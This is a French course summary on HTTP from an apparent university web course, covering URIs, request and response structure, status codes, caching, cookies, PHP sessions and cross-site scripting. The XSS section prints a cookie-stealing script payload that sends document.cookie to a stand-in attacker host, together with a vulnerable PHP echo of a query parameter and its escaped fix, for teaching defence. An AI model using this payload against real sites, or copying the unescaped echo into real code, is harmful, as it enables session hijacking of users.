01 / URI & adresses web

Universal Resource Identifier

Une URI identifie une ressource sur le web. Elle est décomposée en plusieurs parties avec chacune un rôle précis.

Anatomie d'une URI

https://user:pass@iut.univ-reims.fr:443/cours/http/index.php?page=2&theme=dark#intro
scheme — protocole
authority — [userinfo@]host[:port]
path — chemin ressource
query — paramètres
fragment — ancre dans la page
💡
Le fragment (#intro) n'est jamais envoyé au serveur. Il est traité uniquement par le navigateur pour faire défiler la page jusqu'à l'élément avec id="intro".
Schémas courants
http://Web non chiffré (port 80)
https://Web chiffré TLS (port 443)
ftp://Transfert de fichiers
mailto:Envoi d'email
file://Fichier local
Query string

Commence par ?, paires nom=valeur séparées par & :

?firstname=John&lastname=Doe
?darkmode&theme=green
?q=meuh%2C+meuh+%26+meuh
⚠
Les valeurs doivent être encodées — les espaces deviennent + ou %20, & devient %26.

Exemples d'URIs décomposées

Exemples du cours

https://example.com/ httpsexample.com/—

02 / Échanges HTTP

Ce qui se passe quand tu tapes une URL

Un échange HTTP suit toujours le même ordre en 6 étapes. Pas une de plus, pas une de moins.

Déroulement d'un échange
1
Résolution DNS Le navigateur convertit le nom de domaine en adresse IP. iut.univ-reims.fr → 193.50.230.10
2
Connexion TCP Ouverture d'une connexion réseau sur le port 80 (HTTP) ou 443 (HTTPS). Le serveur accepte.
3
Envoi de la requête HTTP Le client envoie son message : méthode, path, en-têtes, éventuellement un corps.
4
Traitement par le serveur Le serveur lit la requête, génère la réponse (exécute PHP si besoin, lit un fichier…)
5
Réponse HTTP Le serveur envoie le code d'état, les en-têtes et le corps (HTML, image, JSON…)
6
Fermeture TCP À l'initiative du serveur. En HTTP/1.1, la connexion peut rester ouverte pour plusieurs échanges.

HTTP 1.0 vs HTTP 1.1

HTTP 1.0 — Une connexion par ressource

Le serveur ferme la connexion TCP après chaque réponse. Pour récupérer une page avec 10 ressources liées (images, CSS, JS), il faut 10 connexions TCP successives.

⚠
Lent et coûteux : établir une connexion TCP prend du temps (échange SYN / SYN-ACK).
HTTP 1.1 — Connexion persistante

La connexion reste ouverte par défaut (Connection: keep-alive). Plusieurs requêtes/réponses sur la même connexion TCP.

Introduce aussi l'en-tête Host: obligatoire, ce qui permet le virtual hosting : plusieurs sites web sur la même adresse IP.

Virtual Hosting

Pourquoi Host: est obligatoire en HTTP/1.1

Tous les enseignants et étudiants de l'IUT partagent la même IP 10.31.6.118. Sans l'en-tête Host:, le serveur ne saurait pas quel "site virtuel" est demandé.

GET / HTTP/1.1
Host: cutrona.ad-urca.univ-reims.fr   ← indispensable !
Connection: close
💡
En HTTP 1.0, l'en-tête Host: n'existe pas — une IP = un seul site web. En HTTP 1.1, Host: est le seul en-tête véritablement obligatoire.
03 / Messages HTTP

Anatomie des messages

Requête et réponse partagent la même structure en 4 parties. Seule la première ligne diffère.

Structure d'une requête GET

GET /cours/http HTTP/1.1
① ligne de requête
Host: iut.univ-reims.fr
Connection: close
Accept: text/html,*/*
User-Agent: Mozilla/5.0
Cookie: theme=dark
② en-têtes
\r\n ← ligne vide OBLIGATOIRE
③ séparateur
(vide pour GET)
④ corps

Structure d'une requête POST

POST /login HTTP/1.1
① ligne de requête
Host: example.com
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
② en-têtes
\r\n
③ séparateur
username=alban&password=1234
④ corps (payload)
⚠
La ligne vide est le seul marqueur de fin des en-têtes. Si tu l'oublies dans une requête écrite à la main, le serveur attend indéfiniment d'autres en-têtes (waiting... waiting... dans le TP).

GET vs POST — comparaison

Critère GET POST
Où sont les données ? Dans l'URL (query string) Dans le corps du message
Visible dans la barre d'adresse ? Oui Non
Bookmarkable ? Oui Non
Peut envoyer des fichiers ? Non Oui (multipart/form-data)
Cacheable ? Oui Non par défaut
Content-Type requis ? Non Oui si corps non vide

04 / Codes de réponse

Les codes d'état HTTP

Le premier chiffre indique la famille. Le message texte est indicatif — seul le code a une valeur contractuelle.

Structure d'une réponse

HTTP/1.1 200 OK
① ligne d'état
Content-Type: text/html; charset=UTF-8
Content-Length: 1256
Last-Modified: Thu, 17 Oct 2019 07:18:26 GMT
Cache-Control: max-age=604800
Connection: close
② en-têtes
\r\n
③ séparateur
<!doctype html>
<html>…</html>
④ corps (HTML)

Familles de codes

1xx
Information

100 Continue — le serveur attend la suite de la requête

2xx
Succès

200 OK · 201 Created (API REST)

3xx
Redirection

301 Permanent · 302 Temporaire · 304 Not Modified

4xx
Erreur client

400 Bad Request · 403 Forbidden · 404 Not Found · 418 I'm a teapot

5xx
Erreur serveur

500 Internal Error · 503 Service Unavailable

💡
Le 304 Not Modified est le seul code de succès sans corps dans la réponse. Il dit : "tu as déjà la bonne version en cache, inutile de re-télécharger."

Codes à retenir absolument

05 / Cache & requêtes conditionnelles

Éviter de tout re-télécharger

Les requêtes conditionnelles permettent au client de demander une ressource uniquement si elle a changé depuis sa dernière visite.

Principe

1
Première visite Le client demande GET /page.html. Le serveur répond 200 OK avec le contenu et un en-tête Last-Modified: Thu, 17 Oct 2019 07:18:26 GMT.
2
Le navigateur met en cache Il retient le fichier et sa date de dernière modification.
3
Deuxième visite Le client envoie une requête conditionnelle avec If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT.
4a
Ressource non modifiée → 304 Not Modified Réponse sans corps. Le navigateur utilise sa version en cache. Économie de bande passante !
4b
Ressource modifiée → 200 OK Le serveur envoie le nouveau contenu avec un nouveau Last-Modified. Le cache est mis à jour.

Exemple de requête conditionnelle

GET /bonjour.html HTTP/1.1
Host: demo.ad-urca.univ-reims.fr
Connection: close
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT ← requête conditionnelle
\r\n
(vide)

Réponse attendue si rien n'a changé :

HTTP/1.1 304 Not Modified
Connection: close
Date: …
\r\n
(pas de corps — économie de bande passante !)

En-têtes liés au cache

En-têteDirectionRôle
Last-ModifiedRéponseDate de dernière modification de la ressource
If-Modified-SinceRequêteDemande la ressource seulement si modifiée après cette date
Cache-Control: max-age=NRéponseDurée de validité du cache en secondes
Cache-Control: no-cacheReq/RépToujours re-valider avec le serveur
Pragma: no-cacheRequêteÉquivalent HTTP/1.0 de Cache-Control: no-cache

06 / Cookies & sessions

Comment HTTP se souvient de toi

HTTP est sans état (stateless) par nature. Les cookies et sessions sont les mécanismes qui compensent cette limitation.

⚠
HTTP est sans état : le serveur ne reconnaît pas un client entre deux requêtes. Il n'a aucune "mémoire" des échanges précédents.

Cookies

Le serveur dépose le cookie
← Réponse du serveur
HTTP/1.1 200 OK
Set-Cookie: theme=dark; Max-Age=3600
...

Le navigateur stocke ce cookie et le renverra à chaque requête sur ce domaine.

Le client renvoie le cookie
→ Requête suivante
GET / HTTP/1.1
Host: example.com
Cookie: theme=dark

Le serveur lit la valeur et adapte la réponse (afficher le thème sombre).

⚠
Les cookies sont stockés et modifiables côté client. Un utilisateur peut changer theme=dark en theme=toto. Si le serveur insère cette valeur sans vérification dans le HTML → bug ou faille de sécurité.

Sessions PHP

Les sessions stockent les données sur le serveur. Seul un identifiant (PHPSESSID) est confié au client via un cookie.

1
Connexion Client envoie ses identifiants en POST. Le serveur crée une session, lui attribue un ID unique : PHPSESSID=abc123.
2
Set-Cookie Le serveur dépose le cookie PHPSESSID=abc123 chez le client. Durée "Session" = disparaît à la fermeture du navigateur.
3
Requêtes suivantes Le client renvoie Cookie: PHPSESSID=abc123. Le serveur consulte son stockage, retrouve les données associées à abc123.
4
Suppression du cookie côté client Le serveur ne reçoit plus l'ID → ne reconnaît plus le client → le redirige vers /login. Mais la session existe toujours côté serveur.
💡
Si quelqu'un vole la valeur de PHPSESSID et l'envoie dans ses propres requêtes, le serveur le considère comme l'utilisateur légitime. C'est l'attaque par vol de session — rendue possible par XSS.
07 / Sécurité & XSS

Cross-Site Scripting

Comment un lien piégé peut voler le cookie de session d'un utilisateur connecté.

⚠
La faille XSS naît quand un serveur insère sans vérification une valeur reçue du client dans le HTML de sa réponse. Si la valeur contient du JavaScript, il s'exécute dans le navigateur de la victime.

Déroulement de l'attaque

1
La victime est connectée Elle a un cookie PHPSESSID=abc123 valide sur le site cible.
2
Elle clique sur un lien piégé L'URL contient un paramètre ?q=<script>…</script>.
3
Le serveur vulnérable réfléchit la valeur Il insère ?q directement dans son HTML sans échappement. La balise <script> se retrouve dans la page.
4
Le navigateur exécute le script Le script lit document.cookie et l'envoie au serveur pirate via une requête image ou fetch.
5
L'attaquant récupère le cookie Il utilise PHPSESSID=abc123 dans ses propres requêtes et usurpe l'identité de la victime.

Le code malveillant décrypté

URL piégée (après décodage)
Valeur du paramètre ?query= :
<script>
  new Image().src = 'http://hacker.example/steal?c='
               + encodeURIComponent(document.cookie);
</script>

Ce code crée une requête vers le serveur pirate en passant les cookies comme paramètre. L'image n'existe pas, mais la requête est envoyée quand même.

Protections

Côté serveur
  • Toujours échapper les données avant de les insérer dans le HTML (htmlspecialchars() en PHP)
  • Valider les valeurs reçues (liste blanche)
  • Mettre le flag HttpOnly sur les cookies de session → JavaScript ne peut plus lire document.cookie
Exemple de protection PHP
// Vulnérable :
echo $_GET['q'];

// Protégé :
echo htmlspecialchars($_GET['q'],
     ENT_QUOTES, 'UTF-8');
